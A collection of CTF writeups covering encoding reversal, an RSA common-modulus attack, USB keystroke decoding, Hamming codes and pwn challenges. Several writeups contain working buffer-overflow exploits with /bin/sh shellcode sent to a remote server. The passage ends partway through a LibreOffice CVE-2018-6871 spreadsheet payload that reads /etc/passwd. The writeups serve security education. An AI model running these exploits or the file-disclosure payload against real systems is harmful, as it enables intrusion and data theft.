<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-bx-r0
description: CTF writeups and security challenges by bx-r0.
---

# Writeups by bx-r0

Source repository: `/repos/bx-r0`

## Repository Index

- CTF_Writeups/README.md
- CTF_Writeups/2019/Boot2Root/README.md
- CTF_Writeups/2019/ENCRYPT/README.md
- CTF_Writeups/2019/FacebookCTF/README.md
- CTF_Writeups/2019/GoogleCTF/README.md
- CTF_Writeups/2019/NACTF/README.md
- CTF_Writeups/2019/SquareCTF_2019/README.md
- CTF_Writeups/2019/SwampCTF/README.md
- CTF_Writeups/2019/TAMUctf/README.md
- CTF_Writeups/2019/TAMUctf/pwn1/README.md
- CTF_Writeups/2019/TAMUctf/pwn3/README.md
- CTF_Writeups/2019/TAMUctf/pwn4/README.md
- CTF_Writeups/2019/TAMUctf/pwn5/README.md
- CTF_Writeups/2019/SwampCTF/Brokerboard/README.md
- CTF_Writeups/2019/SwampCTF/Ghirda_Release/README.md
- CTF_Writeups/2019/SwampCTF/Multi_Contract_Owner/README.md
- CTF_Writeups/2019/SwampCTF/Refundable_Purchase/README.md
- CTF_Writeups/2019/SwampCTF/We_Three_Keys/README.md
- CTF_Writeups/2019/SquareCTF_2019/decodeme/README.md
- CTF_Writeups/2019/SquareCTF_2019/inwasmble/README.md
- CTF_Writeups/2019/NACTF/Keygen/README.md
- CTF_Writeups/2019/GoogleCTF/BeginnerQuests/CookieWorldOrder/README.md
- CTF_Writeups/2019/GoogleCTF/BeginnerQuests/EnterSpaceTimeCoordinates/README.md
- CTF_Writeups/2019/GoogleCTF/BeginnerQuests/GovernmentAgricultureNetwork/README.md
- CTF_Writeups/2019/GoogleCTF/BeginnerQuests/HomeComputer/README.md
- CTF_Writeups/2019/GoogleCTF/BeginnerQuests/Satellite/README.md
- CTF_Writeups/2019/GoogleCTF/BeginnerQuests/WorkComputer/README.md
- CTF_Writeups/2019/FacebookCTF/pdfme/README.md
- CTF_Writeups/2019/FacebookCTF/products_manager/README.md
- CTF_Writeups/2019/ENCRYPT/ham_me_baby/README.md
- CTF_Writeups/2019/ENCRYPT/pwn_0/README.md
- CTF_Writeups/2019/ENCRYPT/pwn_1/README.md
- CTF_Writeups/2019/ENCRYPT/pwn_2/README.md
- CTF_Writeups/2019/Boot2Root/key_me_baby/README.md
- CTF_Writeups/2019/Boot2Root/scatter_me/README.md
- CTF_Writeups/2018/SquareCTF_2018/README.md
- CTF_Writeups/2018/SquareCTF_2018/captcha/README.md
- CTF_Writeups/2018/SquareCTF_2018/de-anonymization/README.md
- CTF_Writeups/2018/SquareCTF_2018/dot-n-dash/README.md
- CTF_Writeups/2018/SquareCTF_2018/fixed_point/README.md
- CTF_Writeups/2018/SquareCTF_2018/flipping_bits/README.md
- CTF_Writeups/2018/SquareCTF_2018/gates_of_hell/README.md
- CTF_Writeups/2018/SquareCTF_2018/gofuscated/README.md
- CTF_Writeups/2018/SquareCTF_2018/leaky_power/README.md
- CTF_Writeups/2018/SquareCTF_2018/postfuscator/README.md
- CTF_Writeups/2018/SquareCTF_2018/shredded/README.md

## Writeup Content


### File: CTF_Writeups/2018/SquareCTF_2018/README.md

# SquareCTF_2018

[`C1 - dot-n-dash`](./dot-n-dash/README.md)

[`C2 - flipping bits`](./flipping_bits/README.md)


<!-- TODO -->
[`C3 - shredded`](#)

<!-- TODO -->
[`C5 - de-anonymization`](#)

<!-- TODO -->
[`C8 - captcha`](#)





### File: CTF_Writeups/2018/SquareCTF_2018/captcha/README.md

# C8: captcha

Task prompt:
```
Charvises (the native species which lived on Charvis 8HD before the first settlers arrived) were very good at math. In a 
surprising symbiosis relationship between humans and Charvises, it was agreed that the Charvises would be responsible for C8.

Can you pass their CAPTCHA (Completely Automated Public Turing Test to tell Charvises and Humans Apart)?
```

The challenge involved completing a complicated CAPTCHA, however, you only have 5 seconds to complete it to receive the flag.

Captcha example:
![](./captcha.png)

### Attempt 1
Initially I thought I could complete the challenge using some OCR (Ocular Character Recognition).

The code below shows the attempt:
```python
import numexpr as nx
import pytesseract
import cv2
import sys

if len(sys.argv) == 2:
    img_path = sys.argv[1]
else:
    print("[*] Usage: python OCR_Attempt IMAGE_PATH")
    exit()

# Read image from disk
im = cv2.imread(img_path, cv2.IMREAD_REDUCED_GRAYSCALE_2)
scale_percentage = 100

# Resizing
width = int(im.shape[1] * scale_percentage / 100)
height = int(im.shape[0] * scale_percentage / 100)
dim = (width, height)
im_resize = cv2.resize(im, dim, interpolation=cv2.INTER_AREA)

# Run tesseract OCR on image
text = pytesseract.image_to_string(image=im_resize, lang="eng")

print(text)
```

Output:
```
((((8 x (((6 - (10 = (4 x 3))) x 8) x (1x ((S x8) x4) -6)x((#+((S
+ (4-38) - (2x8) x (((5+8) x4) x6)))) x ((((& +3) +((6-35)x1))
x 4) x3) -((((4-(4+(9x2)-(Ex({(F+3)+3)-((5-8)-(5~
8)) -(((8-(O+(F-10))) x3) -(9-2)-((&x8)+86))))
```

As you can see the output really was not bad. However, it was not accurate enough to work. I tried with this method for a little longer but the strange font being used was not working with the english NN built into pytesseract. Training a custom NN could have worked but this would have been a time consuming operation.


### File: CTF_Writeups/2018/SquareCTF_2018/de-anonymization/README.md

# C5: de-anonymization
C5 is an online system and is thus very simple to disable. You just need to login as the Captain Yakubovics. Too bad she's no 
longer around to hand you her password.

As luck would have it, you have some anonymized datasets lying around.



### File: CTF_Writeups/2018/SquareCTF_2018/dot-n-dash/README.md

# C1 : dot-n-dash 

### Description
```
You are the last person on planet Charvis 8HD. Everyone has decided to leave because Charvis 9HD is the hipper place to live. 
As 
the last person to leave, your Captain sent you the following instructions:

"Make sure you enable the Charvis 8HD Defense System (CDS) after taking off in your spaceship."

However, you misread the instructions and activated the CDS before leaving the planet. You are now stuck on this planet. Can 
you figure out how to manually disable the 10 defense systems (C1 thru C10) which comprise CDS in order to safely take off?

Thankfully, Charvis 8HD does not have strong dust storms and you will not need to travel 2,000 miles in a rover.
C1: dot-n-dash

The instructions to disable C1 were considered restricted. As a result, they were stored only in encoded form.

The code to decode the instructions was regrettably lost due to cosmic radiation. However, the encoder survived.

Can you still decode the instructions to disable C1?

note: all the files we provide are compressed using jar. You should be able to decompress them on a command line (e.g. jar xf 
dot-n-dash.jar) or using a graphical decompression tool.

Your browser may warn you that "this type of file can harm your computer" because jar files typically contain Java code.
```

The challenge begins with a webpage containing encode and decode functionality for an unknown format.

![](./images/web_interface.png)

For example the code for 'a' is:

```
-------.-.------.
```

The encoding functionality for the website is provided, but the decode was damaged by cosmic radiation. The task is to reverse the encoding.


### Encode

The first step of the encoding is found within this function:

```javascript
var a=[];
for (var i = 0; i < input.length; i++) {
    var t = input.charCodeAt(i);
    for (var j=0; j<8; j++) {
      if ((t >> j) & 1) {
        a.push(1 + j + (input.length - 1 - i) * 8);
      }
    }
}
```

This method has been lightly obfuscated. The method starts by looping around each individual character of the input. Then each character is converted into their numerical form

```javascript
var t = input.charCodeAt(i);
```

Then this numerical value is placed into a for loop with 8 iterations, this was found to be for the 8 bits in a single bytes used to represent a character.

The key element of this function is this line:

```javascript
if ((t >> j) & 1) {
```

With some debugging we found all it was doing was checking for the positions of 1's in a binary value. This is because when a shift results in a 1 dropping off the end the result is equal to one and therefore the condition ```1 & 1``` becomes true.

Then this value is placed into the ```a``` list.

This line:

```javascript
a.push(1 + j + (input.length - 1 - i) * 8);
```

Adds the values to the list in a seemly complex way. The reason behind this will become clear later.

The next stage of the encoding:

```javascript
var b = [];
  while (a.length) {
    var t = (Math.random() * a.length)|0;
    b.push(a[t]);
    a = a.slice(0, t).concat(a.slice(t+1));
  }
```

As it can be seen the use of ```Math.random()```. This was very confusing at this stage, because accurately reversing randomisation is not easily achievable. This will again, be clear later.

With the use of some more debugging we found that this functions purpose is to randomise the order of the array ```a```.


The final function translates this array into the ```-``` and ```.```.

```javascript
var r = '';
while (b.length) {
    var t = b.pop();
    r = r + "-".repeat(t) + ".";
}
return r;
```

### Decode

Now, lets reverse the entire process. Using the final function of the encode we know how to convert the dashs and dots into the ```b``` array.

A function like this will achieve that:

```javascript
var b = []
var dashCount = 0
for (var i = 0; i < input.length; i++)
{
    var char = input.charAt(i);      
    if (char != ".") {
        dashCount++;
    }
    else {
        b.push(dashCount);
        dashCount = 0;
    }
}
```

This provides us with the ```b``` before conversion. 

Now, moving onto the randomised order of ```b```. In the first function when adding to ```a``` the value was multiplied by decreasing values of 8. The line can be seen below:

```javascript
a.push(1 + j + (input.length - 1 - i) * 8);
```

This means the values are separable by a factor of eight. An example can be seen below:

The input ```ab``` produces one ```b``` ordering of:

```
6,9,7,14,2,15
```

If we were to sort this list:

```
2,6,7,9,14,15
```

The list can be separated into two values! Anything over a factor of 8 is separate values of ```a```

We start by sorting ```b```:


```javascript
b.sort(function(a, b){return a - b});
```

We can then use this to reverse the entire problem:

```javascript
var values = []
var bound = 8;
var temp = "00000000"
for (var x = 0; x < b.length; x++)
{
    if (b[x] > bound)
    {
        bound += 8
        values.push(flipAndConvertToAscii(temp))
        
        //Reset
        temp = "00000000"
    }
    
    pos = b[x] - (bound - 8) - 1;
    temp = setCharAt(temp, pos, "1")
    
}
values.push(flipAndConvertToAscii(temp))
values.reverse()
return values.join("")
```

The function:
```javascript
flipAndConvertToAscii()
```

Is needed due to the binary value originally being read right from left and our reversing method doing it the opposite way.

And the function:
```javascript
setCharAt()
```

Places a 1 in a specific position in the ```temp``` variable.

The entire code can be seen below:

```javascript
function setCharAt(str,index,chr) {
    if(index > str.length-1) return str;
    return str.substr(0,index) + chr + str.substr(index+1);
}
function flipAndConvertToAscii(str) {
    parts = str.split("")
    parts.reverse()
    binstr = parts.join("")
    return String.fromCharCode(parseInt(binstr,2).toString(10))
}

function _decode(input) {

    // Conversions from '-' and '.' to the b array
    var b = []
    var dashCount = 0
    for (var i = 0; i < input.length; i++)
    {
        var char = input.charAt(i);      
        if (char != ".") {
            dashCount++;
        }
        else {
            b.push(dashCount);
            dashCount = 0;
        }
    }

    //Randomisation reversing
    b.sort(function(a, b){return a - b});
    
    // Converting b to a
    values = []
    var bound = 8;
    var temp = "00000000"
    for (var x = 0; x < b.length; x++)
    {
        if (b[x] > bound)
        {
            bound += 8
            values.push(flipAndConvertToAscii(temp))
            //Reset
            temp = "00000000"
        }
       
        pos = b[x] - (bound - 8) - 1;
        temp = setCharAt(temp, pos, "1")
        
    }
    values.push(flipAndConvertToAscii(temp))
    values.reverse()
    return values.join("")
}
```

This can now be used to reverse the provided message!

This provides us with the message:

```
Congrats, you solved C1! The flag is flag-bd38908e375c643d03c6.
```

```
FLAG: flag-bd38908e375c643d03c6
```


### File: CTF_Writeups/2018/SquareCTF_2018/fixed_point/README.md

A handwritten note has been added to C10's label.

If you are a Charvis then this is a simple application of Xkrith's First and Sixth Theorems.  If you are not a Charvis then you 
should familiarize yourself with Xkrith's works.  A primer can be found in Room 100034B.

Note: For the humans out there, this system is built on an oscillator. It'll disable itself when you find the oscillator's 
fixed point.

Good luck!



### File: CTF_Writeups/2018/SquareCTF_2018/flipping_bits/README.md

# C2: flipping bits

### Description
```
Disabling C2 requires cracking a RSA message. You have two ciphertexts. The public key is (e1, n).

Fortunately (this time), space rabiation caused some bit flibs and the second ciphertext was encrypted with a faulty public key 
(e2, n). Can you recover the plaintexts?
```

We were also provided with a message:

```
ct1:  13981765388145083997703333682243956434148306954774120760845671024723583618341148528952063316653588928138430524040717841543528568326674293677228449651281422762216853098529425814740156575513620513245005576508982103360592761380293006244528169193632346512170599896471850340765607466109228426538780591853882736654
ct2:  79459949016924442856959059325390894723232586275925931898929445938338123216278271333902062872565058205136627757713051954083968874644581902371182266588247653857616029881453100387797111559677392017415298580136496204898016797180386402171968931958365160589774450964944023720256848731202333789801071962338635072065
e1:  13
e2:  15
modulus:  103109065902334620226101162008793963504256027939117020091876799039690801944735604259018655534860183205031069083254290258577291605287053538752280231959857465853228851714786887294961873006234153079187216285516823832102424110934062954272346111907571393964363630079343598511602013316604641904852018969178919051627

You have two captured ciphertexts. The public key is (e1, n). But,
due to a transient bit flip, the second ciphertext was encrypted with a faulty
public key: (e2, n). Recover the plaintexts.

(The algorithm is RSA.)
```

### Solution
This attack on RSA will involve the use of the same modules ```n```.  The **common modulus** attack.

We need to exponents to satisfy ```gcd(e1, e2) == 1```. This is satisfied because ```gcd(13, 15) == 1```

This means that ```a*e1 + b*e2 = 1```. ```a``` and ```b``` can be used to obtain the the message. The  Extended Euclidean algorithm can be used to find ```a``` and ```b```.

```
a = inverse_mod(e1, e2)
b = b = (1 - (e1 * 7))/e2
```

The message can be generated by using ```a``` and ```b``` like so:s

```
m = (ct1^a) * (ct2^b) % n
```

When converting the value to text we get:

```
FLAG: flag-54d3db5c1efcd7afa579c37bcb560ae0
```


### File: CTF_Writeups/2018/SquareCTF_2018/gates_of_hell/README.md

# C6: gates of hell
C6 is a Linux based system. It was brought to Charvis by the very first settlers. You found a USB drive with a copy of the 
executable.

Now, all you need to do is figure out the correct input to disable C6 through its online interface.



### File: CTF_Writeups/2018/SquareCTF_2018/gofuscated/README.md

# C7: gofuscated
The very first settlers didn?t have a lot of confidence in their hand-assembled C6 system. They therefore built C7, an advanced 
defense system written in Golang.

Given the source code, can you find the correct input?



### File: CTF_Writeups/2018/SquareCTF_2018/leaky_power/README.md

# C4: leaky power
C4 is a very advanced AES based defensive system. You are able to monitor the power lines. Is that enough?

You're given three files:

   - powertraces.npy: Measurements (over time) of power consumption of a chip while performing AES encryption
   - plaintexts.npy: Corresponding plaintext inputs that were encrypted
   - instructions.jwe: File encrypted using the same key as plaintexts.npy.

note: The first two files are NumPy arrays.

note: there's a mistake in the way instructions.jwe was created (the algorithm is A128GCM, not A256GCM).




### File: CTF_Writeups/2018/SquareCTF_2018/postfuscator/README.md

The humans who designed C9 were afraid that the Charvises would disavow their pact.

The humans therefore decided to build an additional defense system, C9, using an ancient programming language. A programming 
language that Charvises didn't even know is a programming language!

Can you figure out the correct input?

postfuscator.jar




### File: CTF_Writeups/2018/SquareCTF_2018/shredded/README.md

# C3: shredded
Instructions to disable C3 were mistaken for an advertisement for new housing on Charvis 9HD. They've been shredded in the 
final office tidy-up. Nobody bothered to empty the trash, so a bit of glue and you should be good?

note: flag is in uppercase for this puzzle.




### File: CTF_Writeups/2019/Boot2Root/README.md

# b00t2root '19

### Forensics

[```key_me_baby - Points: 200```](./key_me_baby/README.md)

### Misc

[```Scatter Me - Points: 210``` ](./scatter_me/README.md)


### File: CTF_Writeups/2019/Boot2Root/key_me_baby/README.md

# key_me_baby

### Background

This task involved a pcap file containing ```USB```  packets.

The initial packets show the insertion of a keyboard:

![](./images/device.png)

With further inspection it was clear that the keys pressed were being transported by USB ```USB_INTERRUPT in``` packets

The packet contains live capture data. Using this ![resource](https://wiki.osdev.org/USB_Human_Interface_Devices) we can decode the transported data.

Each byte is reserved for a different purpose:

| Offset (Byte) | Description               |
|---------------|---------------------------|
| 0             | Modifier keys status.     |       
| 1 	        | Reserved field.           |   
| 2 	        | Keypress #1.              |
| 3 	        | Keypress #2.              |
| 4 	        | Keypress #3.              |
| 5 	        | Keypress #4.              |
| 6 	        | Keypress #5.              |
| 7 	        | Keypress #6.              | 


Therefore, this example:
```
00001c0000000000
```

Can be decoded like so:

```
Modifier = 00
Keypress #1 = 1c
```

```1c``` is the scan-code for the letter ```y```.

The modifier defined which keys were active at the time of the key press such as ```CAPS_LOCK``` or 
```SCROLL_LOCK``` etc. More information can be found at the ![resource](https://wiki.osdev.org/).

### Solution

To obtain these data points we need to extract them from the pcap we need to extract just the hid codes.
We will use a ```tshark``` command for this. The command used is below: 

```
tshark -r data.pcapng -Y "usb.transfer_type == 0x01" -T fields -e usb.capdata | awk 'NF' > keystrokes.txt
```

This grabs the ```usb.capdata``` section of the ```usb.transfer_type``` that is just the ```USB_INTERRUPT in``` packets.

A script can then be used to automate the solution. The code used is below:

```python
import sys
import re
# https://wiki.osdev.org/USB_Human_Interface_Devices

scancodes = {
    '04' : 'a',
    '05' : 'b',
    '06' : 'c',
    '07' : 'd',
    '08' : 'e',
    '09' : 'f',
    '0a' : 'g',
    '0b' : 'h',
    '0c' : 'i',
    '0d' : 'j',
    '0e' : 'k',
    '0f' : 'l',
    '10' : 'm',
    '11' : 'n',
    '12' : 'o',
    '13' : 'p',
    '14' : 'q',
    '15' : 'r',
    '16' : 's',
    '17' : 't',
    '18' : 'u',
    '19' : 'v',
    '1a' : 'w',
    '1b' : 'x',
    '1c' : 'y',
    '1d' : 'z',
    '1e' : '1',
    '1f' : '2',
    '20' : '3',
    '21' : '4',
    '22' : '5',
    '23' : '6',
    '24' : '7',
    '25' : '8',
    '26' : '9',
    '27' : '0',
    '28' : '\n',
    '2a' : '\b',
    '2b' : '\t',
    '2c' : ' ', #Space
    '2d' : '_', # Or "-"
    '2f' : '{', # Or "["
    '30' : '}', # Or "]"
    '34' : '\'',
    '37' : '.', # or '>'
}

if len(sys.argv) != 2:
    print("[*] Usage: python scancode.py FILE_PATH")
    exit()

try:
    data = None
    with open(sys.argv[1], 'r') as file:
        data = file.readlines()
except FileNotFoundError:
    print("[*] File cannot be found!")
    exit(0)

result = [''] * 100
writePosition = 0
for line in data:

    # Checks for length
    if len(line.strip()) != 16:
        continue

    line = line.replace(":", "")

    parts = re.findall(r"..", line)

    # Includes keys active at the time of typing like CAPS LOCK
    mode = parts[0]
    hidCode = parts[2]

    if hidCode != '00':

        # Moves the cursor left or right
        # LEFT
        if hidCode == "50":
            writePosition -= 1

        # RIGHT
        elif hidCode == "4f":
            writePosition += 1
        
        else:
            char = scancodes[hidCode]

            # Caps lock on
            if mode == "02":
                char = char.upper()

            result.insert(writePosition, char)
            writePosition += 1

print("".join(result))
```

The program just works as a dictionary lookup program. Running this through the keystroke.txt data it will provide the flag.

```
FLAG: b00t2root{capturethekey}
```


### File: CTF_Writeups/2019/Boot2Root/scatter_me/README.md

# Scatter Me

![](./brief.png)


We are initially provided with a file ```scatter```:
```
1:3:1;1.25:3:1;1.5:3:1;1.75:3:1;2:3:1;2:2.75:1;2:2.5:1;2:2.25:1;2:2:1;2:1.75:1;2:1.5:1;1:2.25:1;1.25:2.25:1;1.5:2.25:1;1.75:2.25:1;1:1.5:1;1.25:1.5:1;1.5:1.5:1;1.75:1.5:1;3:3:1;3.25:3:1;3.5:3:1;3.75:3:1;4:3:1;4:2.75:1;4:2.5:1;4:2.25:1;4:2:1;4:1.75:1;4:1.5:1;3:1.5:1;3.25:1.5:1;3.5:1.5:1;3.75:1.5:1;3:1.75:1;3:2:1;3:2.25:1;3:2.5:1;3:2.75:1;5:3:1;5.25:3:1;5.5:3:1;5.75:3:1;6:3:1;6:2.75:1;6:2.5:1;6:2.25:1;6:2:1;6:1.75:1;6:1.5:1;5.75:1.5:1;5.5:1.5:1;5.25:1.5:1;5:1.5:1;5:1.75:1;5:2:1;5:2.25:1;5:2.5:1;5:2.75:1;7:3:1;7.25:3:1;7.5:3:1;7.75:3:1;8:3:1;8:2.75:1;8:2.5:1;8:2.25:1;8:2:1;8:1.75:1;8:1.5:1;9:3:1;9.25:3:1;9.5:3:1;9.75:3:1;10:3:1;10:2.75:1;10:2.5:1;10:2.25:1;9.75:2.25:1;9.5:2.25:1;9.25:2.25:1;9:2.25:1;9:2:1;9:1.75:1;9:1.5:1;9.25:1.5:1;9.5:1.5:1;9.75:1.5:1;10:1.5:1;11:3:1;11.25:3:1;11.5:3:1;11.75:3:1;12:3:1;12:2.75:1;12:2.5:1;12:2.25:1;12:2:1;12:1.75:1;12:1.5:1;11.75:1.5:1;11.5:1.5:1;11.25:1.5:1;11:1.5:1;11:1.75:1;11:2:1;11:2.25:1;11:2.5:1;11:2.75:1;11.25:2.25:1;11.5:2.25:1;11.75:2.25:1
```

After looking at the pattern of the text file it can be seen that the pattern follows 3 numbers and a semi colon separator.

The next step was splitting the values into x, y and z. Though z can be ignored due to it never being different from 1.

Below is the python code used:

```python
import matplotlib.pyplot as plt

data = None
with open("./scatter", 'r') as file:
    data = file.read()

points = data.split(";")

plots = []
x = []
y = []

for p in points:

    point_parts = p.split(":")
    x.append(point_parts[0])
    y.append(point_parts[1])

plt.scatter(x, y, c="r")
plt.gca().invert_yaxis()
plt.axis('off')
plt.show()
```

This uses ```matplotlib``` to take the values and produce a graph. Initially the y-axis and provided us with an inaccurate value. Flipping off the y-axis was achieved with this line:

```python
plt.gca().invert_yaxis()
```

The output of the script is below:

![](./flag.png)

This pincode was then used to create the flag

```
FLAG: b00t2root{300728}
```


### File: CTF_Writeups/2019/ENCRYPT/README.md

# ENCRYPT CTF

<img align="right" width=150 src="./logo.png"/>

### Pwn

[```pwn0 - Points: 25```](./pwn_0/README.md)

[```pwn1 - Points: 50```](./pwn_1/README.md)

[```pwn2 - Points: 100```](./pwn_2/README.md)

### Misc

[```ham-me-baby - Points: 50```](./ham_me_baby/README.md)



### File: CTF_Writeups/2019/ENCRYPT/ham_me_baby/README.md

# ham-me-baby
This challenge involved fixing Hamming(7,4) values to receive the flag

Below is the prompt for the netcat server:
```

                        Welcome To 

     ____                       __    _______________  
    / __/__  __________ _____  / /_  / ___/_  __/ __/  
   / _// _ \/ __/ __/ // / _ \/ __/ / /__  / / / _/    
  /___/_//_/\__/_/  \_, / .__/\__/  \___/ /_/ /_/      
                ___/___/_/_____                        
               |_  |/ _ <  / _ \                       
              / __// // / /\_, /                       
             /____/\___/_//___/                        
                                                         

you will be receiving hamming(7,4) codes. your job is to send data bits
from a 7 bit hamming code. 
 ___________________________________________________________________
|                                                                   |
|   DO YOUR RESEARCH : https://en.wikipedia.org/wiki/Hamming(7,4)   |
|  FLAG WILL BE PRINTED AFTER YOU SEND CORRECT DATA BITS 100 TIMES  |
|___________________________________________________________________|

               the order of the bits followed is

                    P1 P2 D3 P4 D5 D6 D7


and come back here. remember somebits could be flipped. you need to send
correct data bits.

[*] CODE: 0101010
[*] DATA: 
```

This involved dynamically taking values and returning the 4 bits of data. 

Hamming(7,4) works by having 3 parity bits for 4 bit of data.

```
P1 P2 D3 P4 D5 D6 D7
0  1  0  1  0  1  0
```

This value is split into 3 parity sets:

Parity 1:
```
P1 D3 D5 D7
0  0  0  0
```

Parity 2:
```
P2 D3 D6 D7
1  0  1  0
```

Parity 3:
```
P4 D5 D6 D7
1  0  1  0
````

Errors in these sets will tell us which value is incorrect and allow us to fix it

For example:
If the error is in ```D3``` we would have errors in ```Parity 1``` and ```Parity 2```. This is the only combination that would give us this error. If we flip D3 we have the correct data value.

Below is the solution to the completed challenge:

```python
from pwn import *
import numpy as np

def even_check(value):
    
    count = 0
    for c in value:
        if c == '1':
            count += 1

    return count % 2 == 0

def flip(bit):
    if bit == '0':
        return '1'
    else:
        return '0'

def hamming(code):
    code_list = np.array(list(code))

    # 1,3,5,7
    p1 = code_list[[0,2,4,6]]
    p1_check = even_check(p1)

    # 2,3,6,7
    p2 = code_list[[1,2,5,6]]
    p2_check = even_check(p2)

    # 4,5,6,7
    p3 = code_list[[3,4,5,6]]
    p3_check = even_check(p3)

    # Err: 3
    if (not p1_check and not p2_check) and p3_check:
        code_list[2] = flip(code_list[2])

    # Err: 5
    elif (not p1_check and not p3_check) and p2_check:
        code_list[4] = flip(code_list[4])

    # Err: 6
    elif (not p2_check and not p3_check) and p1_check:
        code_list[5] = flip(code_list[5])

    # Err: 7
    elif not p2_check and not p3_check and not p1_check:
        code_list[6] = flip(code_list[6])

    # Returns the data bits
    return "".join(code_list[[2,4,5,6]])


r = remote("104.154.106.182", 6969)
r.recvuntil("CODE: ")
code = ""

for x in range(100):
    if not "Invalid" or not "Wrong" in code:
        print(f"CODE: {x}")
        code = r.read().decode("utf-8")[:7]
        response = hamming(code)
        r.send(response + "\n")

        if x != 99:
            r.recvuntil("CODE: ")
        else:
            # Flag?
            print(r.read().decode("utf-8"))
    else:
        print("INVALID")
        print(f"Last response: {response}")
        break
```

```FLAG: encryptCTF{1t_w4s_h4rd3r_th4n_1_th0ught}```


### File: CTF_Writeups/2019/ENCRYPT/pwn_0/README.md

# pwn0

This challenge was a classic buffer overflow. All was required was the overwriting of the the return addr.

By analysing the binary we find the address for ```print_flag()```

```
0x080484dd  print_flag
```

And using ```gdb``` to find the offset

```
1095385409 found at offset: 80
```

This together gives us this exploit code

```python
from pwn import *

r = remote('104.154.106.182', 1234)

# Payload creation
junk = b'A' * 80
print_flag = p32(0x80484dd)

payload = junk + print_flag

r.recvuntil("josh?")
r.sendline(payload)
r.interactive()
```

```
FLAG: encryptCTF{L3t5_R4!53_7h3_J05H}
```




### File: CTF_Writeups/2019/ENCRYPT/pwn_1/README.md

# pwn1

This challenge was almost exactly the same as ```pwn0``` apart from a larger buffer and a different function to jump to.


We started by finding the vuln buffer size:
```
1094806849 found at offset: 140
```

With inspection of the code a fabricated method called ```shell``` has been provided. This will be the address we will overwrite the return pointer with.
```
Dump of assembler code for function shell:
   0x080484ad <+0>:	push   ebp
   0x080484ae <+1>:	mov    ebp,esp
   0x080484b0 <+3>:	sub    esp,0x18
   0x080484b3 <+6>:	mov    DWORD PTR [esp],0x80485c0
   0x080484ba <+13>:	call   0x8048370 <system@plt>
   0x080484bf <+18>:	leave  
   0x080484c0 <+19>:	ret    
End of assembler dump.
```

By once again putting these bits of information together we can generate an exploit.

```python
from pwn import *

r = remote('104.154.106.182', 2345)

# Payload creation
junk = b'A' * 140
shell_addr = p32(0x080484ad)

payload = junk + shell_addr

r.recvuntil("name: ")
r.sendline(payload)
r.interactive()
```

```
FLAG: encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
```


### File: CTF_Writeups/2019/ENCRYPT/pwn_2/README.md

# pwn2

```pwn2``` was a binary that just let us run the command ```ls``` on a server.

Output:
```
$ ls
flag.txt
pwn2
Bye!
```

The binary itself was vulnerable due to classic a ```gets``` overflow. 

There was not a ```win``` function that we could jump to like the previous challenge.

When checking ```checksec``` we can see the binary doe not have NX enabled. This means we can run some shellcode.

```
[*] '/home/main_user/GitHub/CTF_Writeups/2019/ENCRYPT/pwn/pwn_2/pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

The hardest thing about shellcode exploits is actually reaching and executing shellcode consistently on different machine configurations.

With further investigation into the binary I was able to find the perfect ROP gadget for executing the shellcode

```
0x08048544 : jmp esp
```

This will take us to the top of the stack. This is a perfect command to execute our shellcode.

This being put together will result in a payload that is:

```
BUFFER JUNK      RETURN ADDR           SHELLCODE
 [ A x 44]    +   [jmp esp]    +   [\x31\xc0\x50\....]
```

The exploit for the challenge is below:


```python
from pwn import *
import struct

r = remote("104.154.106.182", 3456)

# Length of the vuln buffer
BUFFER_LEN = 44

# sh shellcode 
SHELLCODE = b""
SHELLCODE += b"\x31\xc0\x50\x68\x2f\x2f\x73"
SHELLCODE += b"\x68\x68\x2f\x62\x69\x6e\x89"
SHELLCODE += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
SHELLCODE += b"\xcd\x80\x31\xc0\x40\xcd\x80"

# Will take us to just after the ret pointer
# 0x08048544 : jmp esp
ret_add = p32(0x8048541)

payload = b""
payload += b"A" * BUFFER_LEN
payload += ret_add
payload += SHELLCODE

r.recv()
r.sendline(payload)
r.interactive()
```

```FLAG: encryptCTF{N!c3_j0b_jump3R}```


### File: CTF_Writeups/2019/FacebookCTF/README.md

# Facebook CTF

<img align="right" width=150 src="./logo.png"/>

### Web

[```products manager - Points: 100```](./products_manager/README.md)

[```pdfme - Points: 655```](./pdfme/README.md)



### File: CTF_Writeups/2019/FacebookCTF/pdfme/README.md

![](./brief.png)

The challenge provides us with a simple web page

![](./images/start.png)

It only allows us to upload a `.fods` file (OpenDocument Flat XML Spreadsheet)

Uploading a simple file like the example below:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<office:document [..]>
    <office:body>
        <office:spreadsheet>
            <table:table table:name="1">
                <table:table-column/>
                <table:table-row>
                    <table:table-cell office:value-type="string" calcext:value-type="string">
                        <text:p>TEXT</text:p>
                    </table:table-cell>
                </table:table-row>
                <table:table-row></table:table-row>
            </table:table>
            <table:named-expressions/>
        </office:spreadsheet>
    </office:body>
</office:document>
```

Produces the document:

![](./images/test_pdf.png)

This will be used as our minimal working example later.

After attempts trying XXE (XML External Entity) attack and doing some reading I decided to actually look at the pdf produced

Downloading this `pdf` and running `exiftools` on it gives us:
```
[..]
Creator                         : Calc
Producer                        : LibreOffice 6.0
[..]
```
This shows us that the web application is converting the `.fods` file to a PDF using LibreOffice 6.0 Calc.
Doing some research on LibreOffice gives us [CVE-2018-6871](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6871)

```
LibreOffice before 5.4.5 and 6.x before 6.0.1 allows 
remote attackers to read arbitrary files via =WEBSERVICE 
calls in a document, which use the COM.MICROSOFT.WEBSERVICE function.
```

Further research also provided a [proof of concept](https://github.com/jollheef/libreoffice-remote-arbitrary-file-disclosure) on GitHub. 
Stripping this proof of concepts lets us access local files using `=WEBSERVICE`, this gives us this minimal example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<office:document [..]>
 <office:body>
  <office:spreadsheet>
   <table:calculation-settings table:automatic-find-labels="false" table:use-regular-expressions="false" table:use-wildcards="true"/>
   <table:table table:name="1">
    <table:table-column table:default-cell-style-name="Default"/>
    <table:table-row>
      <table:table-cell 
          table:formula="of:=COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;)" 
          office:value-type="string" 
          office:string-value="" 
          calcext:value-type="string">
       <text:p>#VALUE!</text:p>
     </table:table-cell>
    </table:table-row>
    <table:table-row></table:table-row>
   </table:table>
   <table:named-expressions/>
  </office:spreadsheet>
